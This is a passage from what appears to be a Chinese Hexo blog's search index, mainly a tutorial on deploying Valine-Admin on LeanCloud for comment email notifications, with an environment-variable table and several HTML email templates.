class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">card_music:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果想关掉的时候设置成false即可</p><p>这样我们就成功把网易云的音乐加入自己的侧边小部件了！</p><div class="note info flat"><h3 id="不定期更新"><a href="#不定期更新" class="headerlink" title="不定期更新"></a>不定期更新</h3></div>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valine-Admin博客评论邮件提醒系统部署</title>
      <link href="/posts/Valine-Admin/"/>
      <url>/posts/Valine-Admin/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>本篇内容为博主以前已经完成的事件的记录，并非完成后立即写的文章</p></div><div class="note success flat"><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>本篇内容以已经成功部署Valine作为评论系统为前提，如果还未部署，请参考<a href="https://github.com/DesertsP/Valine-Admin">官方文档</a></p></div><hr><p>本网站一直在使用Valine作为评论系统，之前一直在想：wordpress里面的评论有邮件提醒功能，Valine能不能实现这种功能呢？于是我就到Google去搜索，然后发现了<a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a>这个项目</p><p>首先我们打开我们的Leancloud，进入我们的应用（我这里使用的是国际版，至于为什么选用国际版，有那么一丁点的原因的）</p><p>如图，点击云引擎-设置，然后将Valine-Admin的HTTPS仓库链接贴进去，链接如下：<code>https://github.com/DesertsP/Valine-Admin.git</code></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Valine-Admin/img/Valine-Admin/Engine-Settings-Repo.png" alt="云引擎贴入仓库地址"></p><p>请注意，不要使用SSH链接，会因为没有权限而部署失败！</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Valine-Admin/img/Valine-Admin/SSH-Deploy-Failed.png" alt="SSH链接部署失败"></p><p>部署完后，我们需要按照教程配置我们的环境变量</p><p>下面是必填项（从<a href="https://deserts.io/valine-admin-document/">官方教程</a>搬过来的表格）：</p><table><thead><tr><th align="left">变量</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">SITE_NAME</td><td align="left">Deserts</td><td align="left">[必填]博客名称</td></tr><tr><td align="left">SITE_URL</td><td align="left"><a href="https://panjunwen.com/">https://panjunwen.com</a></td><td align="left">[必填]首页地址</td></tr><tr><td align="left"><strong>SMTP_SERVICE</strong></td><td align="left">QQ</td><td align="left">[新版支持]邮件服务提供商，支持 QQ、163、126、Gmail 以及 <a href="https://nodemailer.com/smtp/well-known/#supported-services">更多</a></td></tr><tr><td align="left">SMTP_USER</td><td align="left"><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td align="left">[必填]SMTP登录用户</td></tr><tr><td align="left">SMTP_PASS</td><td align="left">ccxxxxxxxxch</td><td align="left">[必填]SMTP登录密码（QQ邮箱需要获取独立密码）</td></tr><tr><td align="left">SENDER_NAME</td><td align="left">Deserts</td><td align="left">[必填]发件人</td></tr><tr><td align="left">SENDER_EMAIL</td><td align="left"><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td align="left">[必填]发件邮箱</td></tr><tr><td align="left">ADMIN_URL</td><td align="left"><a href="https://xxx.leanapp.cn/">https://xxx.leanapp.cn/</a></td><td align="left">[建议]Web主机二级域名，用于自动唤醒</td></tr><tr><td align="left">BLOGGER_EMAIL</td><td align="left"><a href="mailto:xxxxx@gmail.com">xxxxx@gmail.com</a></td><td align="left">[可选]博主通知收件地址，默认使用SENDER_EMAIL</td></tr><tr><td align="left">AKISMET_KEY</td><td align="left">xxxxxxxxxxxx</td><td align="left">[可选]Akismet Key 用于垃圾评论检测，设为MANUAL_REVIEW开启人工审核，留空不使用反垃圾</td></tr></tbody></table><p>变量设置完成后，需要到下面Web主机域名框填写自己的后台管理面板的域名</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Valine-Admin/img/Valine-Admin/Subdomain-Manage.png" alt="管理面板域名填写"></p><p>填写完后我们输入自己填写的域名就可以进入后台界面了，第一次进入会要求创建账户</p><div class="note danger flat"><p>如果直接是登录界面请先删除_User表中的所有数据！！！</p></div><p>登录界面应该长这样</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Valine-Admin-1/img/Valine-Admin/Manager-Login.png" alt="评论后台管理面板登录"></p><p>云引擎的其他相关配置我在这里不多说，可以去看<a href="https://deserts.io/valine-admin-document/">官方教程</a>，另外，关于博主的通知邮件，我在Rainbow模板上修改了一点，效果是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Valine-Admin/img/Valine-Admin/Email.png" alt="博主通知邮件模板"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border-radius: 10px 10px 10px 10px;font-size:13px;    color: #555555;width: 666px;font-family:&#x27;Century Gothic&#x27;,&#x27;Trebuchet MS&#x27;,&#x27;Hiragino Sans GB&#x27;,微软雅黑,&#x27;Microsoft Yahei&#x27;,Tahoma,Helvetica,Arial,&#x27;SimSun&#x27;,sans-serif;margin:50px auto;border:1px solid #eee;max-width:100%;background: #ffffff repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 1px 5px rgba(0, 0, 0, 0.15);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;background:#49BDAD;color:#ffffff;border-radius: 10px 10px 0 0;background-image: -moz-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));background-image: -webkit-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));height: 66px;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:15px;word-break:break-all;padding: 23px 32px;margin:0;background-color: hsla(0,0%,100%,.4);border-radius: 10px 10px 0 0;&quot;</span>&gt;</span>您的<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none;color: #ffffff;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>上有新的留言：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px auto;width:90%&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;NICK&#125; 给您的留言如下：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);margin:20px 0px;padding:15px;border-radius:5px;font-size:14px;color:#555555;&quot;</span>&gt;</span>$&#123;COMMENT&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>您可以点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:#12addb&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;POST_URL&#125;#comments&quot;</span>&gt;</span>查看回复的完整內容<span class="tag">&lt;/<span class="name">a</span>&gt;</span>，欢迎再次光临<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:#12addb&quot;</span>                <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;<span class="attribute">text-decoration</span>:none&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而给用户的模板，使用的是官方的Rainbow模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border-radius: 10px 10px 10px 10px;font-size:13px;    color: #555555;width: 666px;font-family:&#x27;Century Gothic&#x27;,&#x27;Trebuchet MS&#x27;,&#x27;Hiragino Sans GB&#x27;,微软雅黑,&#x27;Microsoft Yahei&#x27;,Tahoma,Helvetica,Arial,&#x27;SimSun&#x27;,sans-serif;margin:50px auto;border:1px solid #eee;max-width:100%;background: #ffffff repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 1px 5px rgba(0, 0, 0, 0.15);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;background:#49BDAD;color:#ffffff;border-radius: 10px 10px 0 0;background-image: -moz-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));background-image: -webkit-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));height: 66px;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:15px;word-break:break-all;padding: 23px 32px;margin:0;background-color: hsla(0,0%,100%,.4);border-radius: 10px 10px 0 0;&quot;</span>&gt;</span>您在<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none;color: #ffffff;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>上的留言有新回复啦！<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin:40px auto;width:90%&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;PARENT_NICK&#125; 同学，您曾在文章上发表评论：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);margin:20px 0px;padding:15px;border-radius:5px;font-size:14px;color:#555555;&quot;</span>&gt;</span>$&#123;PARENT_COMMENT&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;NICK&#125; 给您的回复如下：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);margin:20px 0px;padding:15px;border-radius:5px;font-size:14px;color:#555555;&quot;</span>&gt;</span>$&#123;COMMENT&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>您可以点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:#12addb&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;POST_URL&#125;#comments&quot;</span>&gt;</span>查看回复的完整內容<span class="tag">&lt;/<span class="name">a</span>&gt;</span>，欢迎再次光临<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:#12addb&quot;</span>                <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:none&#125;<span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;<span class="attribute">text-decoration</span>:none&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><h3 id="邮件提醒的坑"><a href="#邮件提醒的坑" class="headerlink" title="邮件提醒的坑"></a>邮件提醒的坑</h3><p>如果要使用邮件通知，不需要在你的网站配置中把Notify这一项设定为true，否则只会按照设置中重置密码的模板发送而不会使用在变量中设置的模板，并且云引擎也不会发送邮件；顺带可以把verify调整为false来避免出现Valine的反人类评论验证</p></div><p><a href="https://deserts.io/valine-admin-document/">根据教程</a>配置完相关的变量和管理面板后，邮件就会自动发送了！</p><div class="note primary flat"><p>更改了邮件模板，博主模板更换为以下内容（请注意替换里面的名字），来自<a href="https://www.antmoe.com/">@Dreamy.TZK</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">base</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    ::-webkit-scrollbar &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;cloudAttachStyle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#divNeteaseBigAttach</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#divNeteaseBigAttach_bak</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;blockquoteStyle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">blockquote</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">tabindex</span>=<span class="string">&quot;0&quot;</span> <span class="attr">role</span>=<span class="string">&quot;listitem&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: white;</span></span></span><br><span class="line"><span class="string"><span class="tag">      width: 95%;</span></span></span><br><span class="line"><span class="string"><span class="tag">      max-width: 800px;</span></span></span><br><span class="line"><span class="string"><span class="tag">      margin: auto auto;</span></span></span><br><span class="line"><span class="string"><span class="tag">      border-radius: 5px;</span></span></span><br><span class="line"><span class="string"><span class="tag">      border:orange 1px solid;</span></span></span><br><span class="line"><span class="string"><span class="tag">      overflow: hidden;</span></span></span><br><span class="line"><span class="string"><span class="tag">      -webkit-box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.12);</span></span></span><br><span class="line"><span class="string"><span class="tag">      box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.18);&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">style</span>=<span class="string">&quot;overflow: hidden;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;z-index: 666;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U5bb04af32be544c4b41206d9a42fcacfd.jpg&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding: 5px 20px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;position: relative;</span></span></span><br><span class="line"><span class="string"><span class="tag">        color: white;</span></span></span><br><span class="line"><span class="string"><span class="tag">        float: left;</span></span></span><br><span class="line"><span class="string"><span class="tag">        z-index: 999;</span></span></span><br><span class="line"><span class="string"><span class="tag">        background: orange;</span></span></span><br><span class="line"><span class="string"><span class="tag">        padding: 5px 30px;</span></span></span><br><span class="line"><span class="string"><span class="tag">        margin: -25px auto 0 ;</span></span></span><br><span class="line"><span class="string"><span class="tag">        box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.30)&quot;</span>&gt;</span></span><br><span class="line">          Dear<span class="symbol">&amp;nbsp;</span>GamerNoTitle</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">            来自<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration: none;color: orange &quot;</span>&gt;</span>$&#123;NICK&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>发表评论</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Ta在<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration: none;color: orange &quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">href</span>=<span class="string">&quot;https://bili33.top&quot;</span>&gt;</span>$&#123;SITE_NAME&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>上发表的评论：</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span></span></span><br><span class="line"><span class="tag">          <span class="attr">style</span>=<span class="string">&quot;border-bottom:#ddd 1px solid;border-left:#ddd 1px solid;padding-bottom:20px;background-color:#eee;margin:15px 0px;padding-left:20px;padding-right:20px;border-top:#ddd 1px solid;border-right:#ddd 1px solid;padding-top:20px&quot;</span>&gt;</span></span><br><span class="line">          $&#123;COMMENT&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;margin-top: 40px;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U0968ee80fd5c4f05a02bdda9709b041eE.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;hr&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;</span></span></span><br><span class="line"><span class="string"><span class="tag">                                                                                                  margin:5px auto 5px auto;</span></span></span><br><span class="line"><span class="string"><span class="tag">                                                                                                  display: block;&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-transform: uppercase;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      text-decoration: none;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      font-size: 14px;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      border: 2px solid #6c7575;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      color: #2f3333;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      padding: 10px;</span></span></span><br><span class="line"><span class="string"><span class="tag">                      display: inline-block;</span></span></span><br><span class="line"><span class="string"><span class="tag"> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>  margin: 10px auto 0; &quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">href</span>=<span class="string">&quot;https://bili33.top&quot;</span>&gt;</span>$&#123;SITE_NAME&#125;｜传送！Biu~<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 12px;text-align: center;color: #999;&quot;</span>&gt;</span></span><br><span class="line">          欢迎常来做客哦！<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">          © 2020 <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:orange&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://bili33.top&quot;</span>&gt;</span> $&#123;SITE_NAME&#125; <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _c = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    _c.<span class="property">innerHTML</span> = (_c.<span class="property">innerHTML</span> || <span class="string">&quot;&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">replace</span>(<span class="regexp">/(href|formAction|onclick|javascript)/gi</span>, <span class="string">&quot;__$1&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">replace</span>(<span class="regexp">/&lt;\/?marquee&gt;/gi</span>, <span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: arial, verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">1.666</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">overflow</span>: auto;</span></span><br><span class="line"><span class="language-css">      <span 